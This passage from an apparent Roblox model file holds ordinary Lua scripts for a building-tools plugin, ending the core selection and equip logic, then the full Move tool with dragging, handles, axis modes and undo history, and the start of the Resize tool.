			CurrentTool.Listeners.Button1Down();
		end;

	end ) );

	table.insert( Connections, Mouse.Move:connect( function ()

		-- If the mouse has moved since it was clicked, start 2D selection mode
		if not override_selection and not Select2D.enabled and clicking and selecting and ( click_x ~= Mouse.X or click_y ~= Mouse.Y ) then
			Select2D:start();
		end;

		-- If the target has changed, update the selectionbox appropriately
		if not override_selection and isSelectable( Mouse.Target ) and TargetBox.Adornee ~= Mouse.Target then
			TargetBox.Adornee = Mouse.Target;
		end;

		-- When aiming at something invalid, don't highlight any targets
		if not override_selection and not isSelectable( Mouse.Target ) then
			TargetBox.Adornee = nil;
		end;

		-- Fire tool listeners
		if CurrentTool and CurrentTool.Listeners.Move then
			CurrentTool.Listeners.Move();
		end;

		if override_selection then
			override_selection = false;
		end;

	end ) );

	table.insert( Connections, Mouse.Button1Up:connect( function ()

		clicking = false;

		-- Make sure the person didn't accidentally miss a handle or something
		if not Select2D.enabled and ( Mouse.X ~= click_x or Mouse.Y ~= click_y ) then
			override_selection = true;
		end;

		-- If the target when clicking was invalid then clear the selection (unless we're multi-selecting)
		if not override_selection and not selecting and not isSelectable( Mouse.Target ) then
			Selection:clear();
		end;

		-- If multi-selecting, add to/remove from the selection
		if not override_selection and selecting then

			-- If the item isn't already selected, add it to the selection
			if not Selection:find( Mouse.Target ) then
				if isSelectable( Mouse.Target ) then
					Selection:add( Mouse.Target );
				end;

			-- If the item _is_ already selected, remove it from the selection
			else
				if ( Mouse.X == click_x and Mouse.Y == click_y ) and Selection:find( Mouse.Target ) then
					Selection:remove( Mouse.Target );
				end;
			end;

		-- If not multi-selecting, replace the selection
		else
			if not override_selection and isSelectable( Mouse.Target ) then
				Selection:clear();
				Selection:add( Mouse.Target );
			end;
		end;

		-- Fire tool listeners
		if CurrentTool and CurrentTool.Listeners.Button1Up then
			CurrentTool.Listeners.Button1Up();
		end;

		if override_selection then
			override_selection = false;
		end;

	end ) );

	table.insert( Connections, Mouse.Button2Down:connect( function ()
		-- Fire tool listeners
		if CurrentTool and CurrentTool.Listeners.Button2Down then
			CurrentTool.Listeners.Button2Down();
		end;
	end ) );

	table.insert( Connections, Mouse.Button2Up:connect( function ()
		-- Fire tool listeners
		if CurrentTool and CurrentTool.Listeners.Button2Up then
			CurrentTool.Listeners.Button2Up();
		end;
	end ) );

end;

function unequipBT()

	Mouse = nil;

	-- Remove the mouse target SelectionBox from `Player`
	if TargetBox then
		TargetBox:Destroy();
		TargetBox = nil;
	end;

	-- Disable all the selection boxes temporarily
	for _, SelectionBox in pairs( SelectionBoxes ) do
		SelectionBox.Parent = nil;
	end;

	-- Hide the dock
	Dock.Visible = false;

	-- Disconnect temporary platform-related connections
	for connection_index, Connection in pairs( Connections ) do
		Connection:disconnect();
		Connections[connection_index] = nil;
	end;

	-- Call the `Unequipped` listener of the current tool
	if CurrentTool and CurrentTool.Listeners.Unequipped then
		CurrentTool.Listeners.Unequipped();
	end;

end;

------------------------------------------
-- Provide the platform's environment for
-- other tool scripts to extend upon
------------------------------------------

local tool_list = {
	"Anchor",
	"Collision",
	"Material",
	"Mesh",
	"Move",
	"NewPart",
	"Paint",
	"Resize",
	"Rotate",
	"Surface",
	"Texture",
	"Weld",
	"Lighting",
	"Decorate"
};

-- Make sure all the tool scripts are in the tool & deactivate them
for _, tool_name in pairs( tool_list ) do
	local script_name = "BT" .. tool_name .. "Tool";
	repeat wait() until script:FindFirstChild( script_name );
	script[script_name].Disabled = true;
end;

-- Load the platform
if not _G.BTCoreEnv then
	_G.BTCoreEnv = {};
end;
_G.BTCoreEnv[Tool] = getfenv( 0 );
CoreReady = true;

-- Reload the tool scripts
for _, tool_name in pairs( tool_list ) do
	local script_name = "BT" .. tool_name .. "Tool";
	script[script_name].Disabled = false;
end;

-- Wait for all the tools to load
for _, tool_name in pairs( tool_list ) do
	if not Tools[tool_name] then
		repeat wait() until Tools[tool_name];
	end;
	repeat wait() until Tools[tool_name].Loaded;
end;

-- Activate the plugin and tool connections
if ToolType == 'plugin' then
	local plugin_active = false;
	ToolbarButton.Click:connect( function ()
		if plugin_active then
			plugin_active = false;
			unequipBT();
		else
			plugin_active = true;
			plugin:Activate( true );
			equipBT( plugin:GetMouse() );
		end;
	end );
	plugin.Deactivation:connect( unequipBT );

elseif ToolType == 'tool' then
	Tool.Equipped:connect( equipBT );
	Tool.Unequipped:connect( unequipBT );
end;]]></ProtectedString>
						</Properties>
						<Item class="LocalScript" referent="RBX7C76A35E18D44CF691318553A784F833">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTMoveTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Move tool
------------------------------------------

-- Create the main container for this tool
Tools.Move = {};

-- Define the color of the tool
Tools.Move.Color = BrickColor.new( "Deep orange" );

-- Keep a container for temporary connections
Tools.Move.Connections = {};

-- Keep options in a container too
Tools.Move.Options = {
	["increment"] = 1;
	["axes"] = "global";
};

-- Keep internal state data in its own container
Tools.Move.State = {
	["distance_moved"] = 0;
	["moving"] = false;
	["PreMove"] = {};
};

-- Add listeners
Tools.Move.Listeners = {};

Tools.Move.Listeners.Equipped = function ()

	local self = Tools.Move;

	-- Make sure the tool is actually being equipped (because this is the default tool)
	if not Mouse then
		return;
	end;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Create the boundingbox if it doesn't already exist
	if not self.BoundingBox then
		self.BoundingBox = RbxUtility.Create "Part" {
			Name = "BTBoundingBox";
			CanCollide = false;
			Transparency = 1;
			Anchored = true;
		};
	end;
	Mouse.TargetFilter = self.BoundingBox;

	-- Refresh the axis type option
	self:changeAxes( self.Options.axes );

	-- Listen for any keystrokes that might affect any dragging operation
	self.Connections.DraggerKeyListener = Mouse.KeyDown:connect( function ( key )

		local key = key:lower();

		-- Make sure a dragger exists
		if not self.Dragger then
			return;
		end;

		-- Rotate along the Z axis if `r` is pressed
		if key == "r" then
			self.Dragger:AxisRotate( Enum.Axis.Z );

		-- Rotate along the X axis if `t` is pressed
		elseif key == "t" then
			self.Dragger:AxisRotate( Enum.Axis.X );

		-- Rotate along the Y axis if `y` is pressed
		elseif key == "y" then
			self.Dragger:AxisRotate( Enum.Axis.Y );
		end;

		-- Simulate a mouse move so that it applies the changes
		self.Dragger:MouseMove( Mouse.UnitRay );

	end );

	-- Oh, and update the boundingbox and the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

				-- Update the boundingbox if it's visible
				if self.Options.axes == "global" then
					self:updateBoundingBox();
				end;

			end;

		end;

	end )();

end;

Tools.Move.Listeners.Unequipped = function ()

	local self = Tools.Move;

	-- Stop the update loop
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Stop any dragging
	self:FinishDragging();

	-- Hide the GUI
	self:hideGUI();

	-- Hide the handles
	self:hideHandles();

	-- Clear out any temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of the selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Move.updateGUI = function ( self )

	if self.GUI then
		local GUI = self.GUI;

		if #Selection.Items > 0 then

			-- Look for identical numbers in each axis
			local position_x, position_y, position_z =  nil, nil, nil;
			for item_index, Item in pairs( Selection.Items ) do

				-- Set the first values for the first item
				if item_index == 1 then
					position_x, position_y, position_z = _round( Item.Position.x, 2 ), _round( Item.Position.y, 2 ), _round( Item.Position.z, 2 );

				-- Otherwise, compare them and set them to `nil` if they're not identical
				else
					if position_x ~= _round( Item.Position.x, 2 ) then
						position_x = nil;
					end;
					if position_y ~= _round( Item.Position.y, 2 ) then
						position_y = nil;
					end;
					if position_z ~= _round( Item.Position.z, 2 ) then
						position_z = nil;
					end;
				end;

			end;

			-- If each position along each axis is the same, display that number; otherwise, display "*"
			if not self.State.pos_x_focused then
				GUI.Info.Center.X.TextBox.Text = position_x and tostring( position_x ) or "*";
			end;
			if not self.State.pos_y_focused then
				GUI.Info.Center.Y.TextBox.Text = position_y and tostring( position_y ) or "*";
			end;
			if not self.State.pos_z_focused then
				GUI.Info.Center.Z.TextBox.Text = position_z and tostring( position_z ) or "*";
			end;

			GUI.Info.Visible = true;
		else
			GUI.Info.Visible = false;
		end;

		if self.State.distance_moved then
			GUI.Changes.Text.Text = "moved " .. tostring( self.State.distance_moved ) .. " studs";
			GUI.Changes.Position = GUI.Info.Visible and UDim2.new( 0, 5, 0, 165 ) or UDim2.new( 0, 5, 0, 100 );
			GUI.Changes.Visible = true;
		else
			GUI.Changes.Text.Text = "";
			GUI.Changes.Visible = false;
		end;
	end;

end;

Tools.Move.changePosition = function ( self, component, new_value )

	self:startHistoryRecord();

	-- Change the position of each item selected
	for _, Item in pairs( Selection.Items ) do
		Item.CFrame = CFrame.new(
			component == 'x' and new_value or Item.Position.x,
			component == 'y' and new_value or Item.Position.y,
			component == 'z' and new_value or Item.Position.z
		) * CFrame.Angles( Item.CFrame:toEulerAnglesXYZ() );
	end;

	self:finishHistoryRecord();

end;

Tools.Move.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		initial_positions = {};
		terminal_positions = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.CFrame = self.initial_positions[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.CFrame = self.terminal_positions[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_positions[Item] = Item.CFrame;
		end;
	end;

end;

Tools.Move.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_positions[Item] = Item.CFrame;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Move.StartDragging = function ( self, Target )
	-- Begins dragging the current selection

	for _, Item in pairs( Selection.Items ) do
		Item.RotVelocity = Vector3.new( 0, 0, 0 );
		Item.Velocity = Vector3.new( 0, 0, 0 );
	end;

	self:startHistoryRecord();

	self.State.dragging = true;
	override_selection = true;

	self.Dragger = Instance.new( "Dragger" );
	self.Dragger:MouseDown( Target, Target.CFrame:toObjectSpace( CFrame.new( Mouse.Hit.p ) ).p, Selection.Items );

	-- Release the dragger once the left mouse button is released
	self.Connections.DraggerConnection = Services.UserInputService.InputEnded:connect( function ( InputData )
		if InputData.UserInputType == Enum.UserInputType.MouseButton1 then
			self:FinishDragging();
		end;
	end );

end;

Tools.Move.FinishDragging = function ( self )
	-- Finishes and cleans up the selection dragger

	override_selection = true;

	-- Disable the dragger
	if self.Connections.DraggerConnection then
		self.Connections.DraggerConnection:disconnect();
		self.Connections.DraggerConnection = nil;
	end;
	if not self.Dragger then
		return;
	end;
	self.Dragger:MouseUp();
	self.State.dragging = false;
	self.Dragger:Destroy();
	self.Dragger = nil;

	self:finishHistoryRecord();

end;

Tools.Move.Listeners.Button1Down = function ()

	local self = Tools.Move;

	local Target = self.ManualTarget or Mouse.Target;
	self.ManualTarget = nil;

	-- If an unselected part is being moved, switch to it
	if not Selection:find( Target ) and isSelectable( Target ) then
		Selection:clear();
		Selection:add( Target );
	end;

	-- If the unselected target can't be selected at all, ignore the rest of the procedure
	if not Selection:find( Target ) then
		return;
	end;

	self:StartDragging( Target );

end;

Tools.Move.Listeners.Move = function ()

	local self = Tools.Move;

	if not self.Dragger then
		return;
	end;

	override_selection = true;

	self.Dragger:MouseMove( Mouse.UnitRay );

end;

Tools.Move.Listeners.KeyUp = function ( Key )
	local self = Tools.Move;

	-- Provide a keyboard shortcut to the increment input
	if Key == '-' and self.GUI then
		self.GUI.IncrementOption.Increment.TextBox:CaptureFocus();
	end;
end;

Tools.Move.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTMoveToolGUI:Clone();
		Container.Parent = UI;

		-- Change the axis type option when the button is clicked
		Container.AxesOption.Global.Button.MouseButton1Down:connect( function ()
			self:changeAxes( "global" );
			Container.AxesOption.Global.SelectedIndicator.BackgroundTransparency = 0;
			Container.AxesOption.Global.Background.Image = Assets.DarkSlantedRectangle;
			Container.AxesOption.Local.SelectedIndicator.BackgroundTransparency = 1;
			Container.AxesOption.Local.Background.Image = Assets.LightSlantedRectangle;
			Container.AxesOption.Last.SelectedIndicator.BackgroundTransparency = 1;
			Container.AxesOption.Last.Background.Image = Assets.LightSlantedRectangle;
		end );

		Container.AxesOption.Local.Button.MouseButton1Down:connect( function ()
			self:changeAxes( "local" );
			Container.AxesOption.Global.SelectedIndicator.BackgroundTransparency = 1;
			Container.AxesOption.Global.Background.Image = Assets.LightSlantedRectangle;
			Container.AxesOption.Local.SelectedIndicator.BackgroundTransparency = 0;
			Container.AxesOption.Local.Background.Image = Assets.DarkSlantedRectangle;
			Container.AxesOption.Last.SelectedIndicator.BackgroundTransparency = 1;
			Container.AxesOption.Last.Background.Image = Assets.LightSlantedRectangle;
		end );

		Container.AxesOption.Last.Button.MouseButton1Down:connect( function ()
			self:changeAxes( "last" );
			Container.AxesOption.Global.SelectedIndicator.BackgroundTransparency = 1;
			Container.AxesOption.Global.Background.Image = Assets.LightSlantedRectangle;
			Container.AxesOption.Local.SelectedIndicator.BackgroundTransparency = 1;
			Container.AxesOption.Local.Background.Image = Assets.LightSlantedRectangle;
			Container.AxesOption.Last.SelectedIndicator.BackgroundTransparency = 0;
			Container.AxesOption.Last.Background.Image = Assets.DarkSlantedRectangle;
		end );

		-- Change the increment option when the value of the textbox is updated
		Container.IncrementOption.Increment.TextBox.FocusLost:connect( function ( enter_pressed )
			self.Options.increment = tonumber( Container.IncrementOption.Increment.TextBox.Text ) or self.Options.increment;
			Container.IncrementOption.Increment.TextBox.Text = tostring( self.Options.increment );
		end );

		-- Add functionality to the position inputs
		Container.Info.Center.X.TextButton.MouseButton1Down:connect( function ()
			self.State.pos_x_focused = true;
			Container.Info.Center.X.TextBox:CaptureFocus();
		end );
		Container.Info.Center.X.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.Center.X.TextBox.Text );
			if potential_new then
				self:changePosition( 'x', potential_new );
			end;
			self.State.pos_x_focused = false;
		end );
		Container.Info.Center.Y.TextButton.MouseButton1Down:connect( function ()
			self.State.pos_y_focused = true;
			Container.Info.Center.Y.TextBox:CaptureFocus();
		end );
		Container.Info.Center.Y.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.Center.Y.TextBox.Text );
			if potential_new then
				self:changePosition( 'y', potential_new );
			end;
			self.State.pos_y_focused = false;
		end );
		Container.Info.Center.Z.TextButton.MouseButton1Down:connect( function ()
			self.State.pos_z_focused = true;
			Container.Info.Center.Z.TextBox:CaptureFocus();
		end );
		Container.Info.Center.Z.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.Center.Z.TextBox.Text );
			if potential_new then
				self:changePosition( 'z', potential_new );
			end;
			self.State.pos_z_focused = false;
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Move.hideGUI = function ( self )

	-- Hide the GUI if it exists
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Move.showHandles = function ( self, Part )

	-- Create the handles if they don't exist yet
	if not self.Handles then

		-- Create the object
		self.Handles = RbxUtility.Create "Handles" {
			Name = "BTMovementHandles";
			Color = self.Color;
			Parent = GUIContainer;
		};

		-- Add functionality to the handles

		self.Handles.MouseButton1Down:connect( function ()

			-- Prevent the platform from thinking we're selecting
			override_selection = true;
			self.State.moving = true;

			-- Clear the change stats
			self.State.distance_moved = 0;

			self:startHistoryRecord();

			-- Do a few things to the selection before manipulating it
			for _, Item in pairs( Selection.Items ) do

				-- Keep a copy of the state of each item
				self.State.PreMove[Item] = Item:Clone();

				-- Anchor each item
				Item.Anchored = true;

			end;

			-- Return stuff to normal once the mouse button is released
			self.Connections.HandleReleaseListener = Services.UserInputService.InputEnded:connect( function ( InputData )

				-- Make sure the left mouse button was released
				if InputData.UserInputType ~= Enum.UserInputType.MouseButton1 then
					return;
				end;

				-- Prevent the platform from thinking we're selecting
				override_selection = true;
				self.State.moving = false;

				-- Stop this connection from firing again
				if self.Connections.HandleReleaseListener then
					self.Connections.HandleReleaseListener:disconnect();
					self.Connections.HandleReleaseListener = nil;
				end;

				self:finishHistoryRecord();

				-- Restore properties that may have been changed temporarily
				-- from the pre-movement state copies
				for Item, PreviousItemState in pairs( self.State.PreMove ) do
					Item.Anchored = PreviousItemState.Anchored;
					self.State.PreMove[Item] = nil;
					Item:MakeJoints();
					Item.Velocity = Vector3.new( 0, 0, 0 );
					Item.RotVelocity = Vector3.new( 0, 0, 0 );
				end;

			end );

		end );

		self.Handles.MouseDrag:connect( function ( face, drag_distance )

			-- Calculate which multiple of the increment to use based on the current drag distance's
			-- proximity to their nearest upper and lower multiples

			local difference = drag_distance % self.Options.increment;

			local lower_degree = drag_distance - difference;
			local upper_degree = drag_distance - difference + self.Options.increment;

			local lower_degree_proximity = math.abs( drag_distance - lower_degree );
			local upper_degree_proximity = math.abs( drag_distance - upper_degree );

			if lower_degree_proximity <= upper_degree_proximity then
				drag_distance = lower_degree;
			else
				drag_distance = upper_degree;
			end;

			local increase = drag_distance;

			self.State.distance_moved = drag_distance;

			-- Increment the position of each selected item in the direction of `face`
			for _, Item in pairs( Selection.Items ) do

				-- Remove any joints connected with `Item` so that it can freely move
				Item:BreakJoints();

				-- Update the position of `Item` depending on the type of axes that is currently set
				if face == Enum.NormalId.Top then
					if self.Options.axes == "global" then
						Item.CFrame = CFrame.new( self.State.PreMove[Item].CFrame.p ):toWorldSpace( CFrame.new( 0, increase, 0 ) ) * CFrame.Angles( self.State.PreMove[Item].CFrame:toEulerAnglesXYZ() );
					elseif self.Options.axes == "local" then
						Item.CFrame = self.State.PreMove[Item].CFrame:toWorldSpace( CFrame.new( 0, increase, 0 ) );
					elseif self.Options.axes == "last" then
						Item.CFrame = self.State.PreMove[Selection.Last].CFrame:toWorldSpace( CFrame.new( 0, increase, 0 ) ):toWorldSpace( self.State.PreMove[Item].CFrame:toObjectSpace( self.State.PreMove[Selection.Last].CFrame ):inverse() );
					end;

				elseif face == Enum.NormalId.Bottom then
					if self.Options.axes == "global" then
						Item.CFrame = CFrame.new( self.State.PreMove[Item].CFrame.p ):toWorldSpace( CFrame.new( 0, -increase, 0 ) ) * CFrame.Angles( self.State.PreMove[Item].CFrame:toEulerAnglesXYZ() );
					elseif self.Options.axes == "local" then
						Item.CFrame = self.State.PreMove[Item].CFrame:toWorldSpace( CFrame.new( 0, -increase, 0 ) );
					elseif self.Options.axes == "last" then
						Item.CFrame = self.State.PreMove[Selection.Last].CFrame:toWorldSpace( CFrame.new( 0, -increase, 0 ) ):toWorldSpace( self.State.PreMove[Item].CFrame:toObjectSpace( self.State.PreMove[Selection.Last].CFrame ):inverse() );
					end;

				elseif face == Enum.NormalId.Front then
					if self.Options.axes == "global" then
						Item.CFrame = CFrame.new( self.State.PreMove[Item].CFrame.p ):toWorldSpace( CFrame.new( 0, 0, -increase ) ) * CFrame.Angles( self.State.PreMove[Item].CFrame:toEulerAnglesXYZ() );
					elseif self.Options.axes == "local" then
						Item.CFrame = self.State.PreMove[Item].CFrame:toWorldSpace( CFrame.new( 0, 0, -increase ) );
					elseif self.Options.axes == "last" then
						Item.CFrame = self.State.PreMove[Selection.Last].CFrame:toWorldSpace( CFrame.new( 0, 0, -increase ) ):toWorldSpace( self.State.PreMove[Item].CFrame:toObjectSpace( self.State.PreMove[Selection.Last].CFrame ):inverse() );
					end;

				elseif face == Enum.NormalId.Back then
					if self.Options.axes == "global" then
						Item.CFrame = CFrame.new( self.State.PreMove[Item].CFrame.p ):toWorldSpace( CFrame.new( 0, 0, increase ) ) * CFrame.Angles( self.State.PreMove[Item].CFrame:toEulerAnglesXYZ() );
					elseif self.Options.axes == "local" then
						Item.CFrame = self.State.PreMove[Item].CFrame:toWorldSpace( CFrame.new( 0, 0, increase ) );
					elseif self.Options.axes == "last" then
						Item.CFrame = self.State.PreMove[Selection.Last].CFrame:toWorldSpace( CFrame.new( 0, 0, increase ) ):toWorldSpace( self.State.PreMove[Item].CFrame:toObjectSpace( self.State.PreMove[Selection.Last].CFrame ):inverse() );
					end;

				elseif face == Enum.NormalId.Right then
					if self.Options.axes == "global" then
						Item.CFrame = CFrame.new( self.State.PreMove[Item].CFrame.p ):toWorldSpace( CFrame.new( increase, 0, 0 ) ) * CFrame.Angles( self.State.PreMove[Item].CFrame:toEulerAnglesXYZ() );
					elseif self.Options.axes == "local" then
						Item.CFrame = self.State.PreMove[Item].CFrame:toWorldSpace( CFrame.new( increase, 0, 0 ) );
					elseif self.Options.axes == "last" then
						Item.CFrame = self.State.PreMove[Selection.Last].CFrame:toWorldSpace( CFrame.new( increase, 0, 0 ) ):toWorldSpace( self.State.PreMove[Item].CFrame:toObjectSpace( self.State.PreMove[Selection.Last].CFrame ):inverse() );
					end;

				elseif face == Enum.NormalId.Left then
					if self.Options.axes == "global" then
						Item.CFrame = CFrame.new( self.State.PreMove[Item].CFrame.p ):toWorldSpace( CFrame.new( -increase, 0, 0 ) ) * CFrame.Angles( self.State.PreMove[Item].CFrame:toEulerAnglesXYZ() );
					elseif self.Options.axes == "local" then
						Item.CFrame = self.State.PreMove[Item].CFrame:toWorldSpace( CFrame.new( -increase, 0, 0 ) );
					elseif self.Options.axes == "last" then
						Item.CFrame = self.State.PreMove[Selection.Last].CFrame:toWorldSpace( CFrame.new( -increase, 0, 0 ) ):toWorldSpace( self.State.PreMove[Item].CFrame:toObjectSpace( self.State.PreMove[Selection.Last].CFrame ):inverse() );
					end;

				end;

			end;

		end );

	end;

	-- Stop listening for the existence of the previous adornee (if any)
	if self.Connections.AdorneeExistenceListener then
		self.Connections.AdorneeExistenceListener:disconnect();
		self.Connections.AdorneeExistenceListener = nil;
	end;

	-- Attach the handles to `Part`
	self.Handles.Adornee = Part;

	-- Make sure to hide the handles if `Part` suddenly stops existing
	self.Connections.AdorneeExistenceListener = Part.AncestryChanged:connect( function ( Object, NewParent )

		-- Make sure this change in parent applies directly to `Part`
		if Object ~= Part then
			return;
		end;

		-- Show the handles according to the existence of the part
		if NewParent == nil then
			self:hideHandles();
		else
			self:showHandles( Part );
		end;

	end );

end;

Tools.Move.hideHandles = function ( self )

	-- Hide the handles if they exist
	if self.Handles then
		self.Handles.Adornee = nil;
	end;

end;

Tools.Move.updateBoundingBox = function ( self )

	if #Selection.Items > 0 and not self.State.dragging then
		local SelectionSize, SelectionPosition = _getCollectionInfo( Selection.Items );
		self.BoundingBox.Size = SelectionSize;
		self.BoundingBox.CFrame = SelectionPosition;
		self:showHandles( self.BoundingBox );

	else
		self:hideHandles();
	end;

end;

Tools.Move.changeAxes = function ( self, new_axes )

	-- Have a quick reference to the GUI (if any)
	local AxesOptionGUI = self.GUI and self.GUI.AxesOption or nil;

	-- Disconnect any handle-related listeners that are specific to a certain axes option

	if self.Connections.HandleFocusChangeListener then
		self.Connections.HandleFocusChangeListener:disconnect();
		self.Connections.HandleFocusChangeListener = nil;
	end;

	if self.Connections.HandleSelectionChangeListener then
		self.Connections.HandleSelectionChangeListener:disconnect();
		self.Connections.HandleSelectionChangeListener = nil;
	end;

	if new_axes == "global" then

		-- Update the options
		self.Options.axes = "global";

		-- Clear out any previous adornee
		self:hideHandles();

		-- Focus the handles on the boundary box
		self:showHandles( self.BoundingBox );

		-- Update the GUI's option panel
		if self.GUI then
			AxesOptionGUI.Global.SelectedIndicator.BackgroundTransparency = 0;
			AxesOptionGUI.Global.Background.Image = Assets.DarkSlantedRectangle;
			AxesOptionGUI.Local.SelectedIndicator.BackgroundTransparency = 1;
			AxesOptionGUI.Local.Background.Image = Assets.LightSlantedRectangle;
			AxesOptionGUI.Last.SelectedIndicator.BackgroundTransparency = 1;
			AxesOptionGUI.Last.Background.Image = Assets.LightSlantedRectangle;
		end;

	end;

	if new_axes == "local" then

		-- Update the options
		self.Options.axes = "local";

		-- Always have the handles on the most recent addition to the selection
		self.Connections.HandleSelectionChangeListener = Selection.Changed:connect( function ()

			-- Clear out any previous adornee
			self:hideHandles();

			-- If there /is/ a last item in the selection, attach the handles to it
			if Selection.Last then
				self:showHandles( Selection.Last );
			end;

		end );

		-- Switch the adornee of the handles if the second mouse button is pressed
		self.Connections.HandleFocusChangeListener = Mouse.Button2Up:connect( function ()

			-- Make sure the platform doesn't think we're selecting
			override_selection = true;

			-- If the target is in the selection, make it the new adornee
			if Selection:find( Mouse.Target ) then
				Selection:focus( Mouse.Target );
				self:showHandles( Mouse.Target );
			end;

		end );

		-- Finally, attach the handles to the last item added to the selection (if any)
		if Selection.Last then
			self:showHandles( Selection.Last );
		end;

		-- Update the GUI's option panel
		if self.GUI then
			AxesOptionGUI.Global.SelectedIndicator.BackgroundTransparency = 1;
			AxesOptionGUI.Global.Background.Image = Assets.LightSlantedRectangle;
			AxesOptionGUI.Local.SelectedIndicator.BackgroundTransparency = 0;
			AxesOptionGUI.Local.Background.Image = Assets.DarkSlantedRectangle;
			AxesOptionGUI.Last.SelectedIndicator.BackgroundTransparency = 1;
			AxesOptionGUI.Last.Background.Image = Assets.LightSlantedRectangle;
		end;

	end;

	if new_axes == "last" then

		-- Update the options
		self.Options.axes = "last";

		-- Always have the handles on the most recent addition to the selection
		self.Connections.HandleSelectionChangeListener = Selection.Changed:connect( function ()

			-- Clear out any previous adornee
			self:hideHandles();

			-- If there /is/ a last item in the selection, attach the handles to it
			if Selection.Last then
				self:showHandles( Selection.Last );
			end;

		end );

		-- Switch the adornee of the handles if the second mouse button is pressed
		self.Connections.HandleFocusChangeListener = Mouse.Button2Up:connect( function ()

			-- Make sure the platform doesn't think we're selecting
			override_selection = true;

			-- If the target is in the selection, make it the new adornee
			if Selection:find( Mouse.Target ) then
				Selection:focus( Mouse.Target );
				self:showHandles( Mouse.Target );
			end;

		end );

		-- Finally, attach the handles to the last item added to the selection (if any)
		if Selection.Last then
			self:showHandles( Selection.Last );
		end;

		-- Update the GUI's option panel
		if self.GUI then
			AxesOptionGUI.Global.SelectedIndicator.BackgroundTransparency = 1;
			AxesOptionGUI.Global.Background.Image = Assets.LightSlantedRectangle;
			AxesOptionGUI.Local.SelectedIndicator.BackgroundTransparency = 1;
			AxesOptionGUI.Local.Background.Image = Assets.LightSlantedRectangle;
			AxesOptionGUI.Last.SelectedIndicator.BackgroundTransparency = 0;
			AxesOptionGUI.Last.Background.Image = Assets.DarkSlantedRectangle;
		end;

	end;

end;

Tools.Move.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBXB6073C38AD084F1F95D025D034F1BE05">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTResizeTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Resize tool
------------------------------------------

-- Create the tool
Tools.Resize = {};

-- Create structures that will be used within the tool
Tools.Resize.Connections = {};

Tools.Resize.Options = {
	["increment"] = 1;
	["directions"] = "normal";
};

Tools.Resize.State = {
	["PreResize"] = {};
	["previous_distance"] = 0;
	["resizing"] = false;
	["length_resized"] = 0;
};

Tools.Resize.Listeners = {};

-- Define the color of the tool
Tools.Resize.Color = BrickColor.new( "Cyan" );

Tools.Resize.Listeners.Equipped = function ()

	local self = Tools.Resize;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Always have the handles on the most recent addition to the selection
	table.insert( self.Connections, Selection.Changed:connect( function ()

		-- Clear out any previous adornee
		self:hideHandles();

		-- If there /is/ a last item in the selection, attach the handles to it
		if Selection.Last then
			self:showHandles( Selection.Last );
		end;

	end ) );

	-- Switch the adornee of the handles if the second mouse button is pressed
	table.insert( self.Connections, Mouse.Button2Up:connect( function ()

		-- Make sure the platform doesn't think we're selecting
		override_selection = true;

		-- If the target is in the selection, make it the new adornee
		if Selection:find( Mouse.Target ) then
			Selection:focus( Mouse.Target );
		end;

	end ) );

	-- Finally, attach the handles to the last item added to the selection (if any)
	if Selection.Last then
		self:showHandles( Selection.Last );
	end;

